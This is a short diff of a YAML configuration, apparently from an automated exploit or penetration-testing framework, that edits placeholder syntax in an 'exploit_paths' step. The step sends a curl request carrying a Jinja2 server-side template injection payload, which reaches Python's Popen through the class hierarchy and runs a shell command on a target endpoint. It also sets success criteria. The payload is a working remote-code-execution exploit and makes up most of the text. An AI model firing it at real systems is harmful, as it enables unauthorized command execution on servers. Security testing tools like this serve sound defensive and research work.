@@ -146,7 +146,7 @@ exploit_paths:
         command: |
           # 尝试常见的 Popen payload
           curl -s -G \
-            --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()[§POPEN_IDX§]('id',shell=True,stdout=-1).communicate()[0].decode()}}" \
+            --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()[{POPEN_IDX}]('id',shell=True,stdout=-1).communicate()[0].decode()}}" \
             {ENDPOINT} --max-time 10
         timeout: 15
         success_criteria:
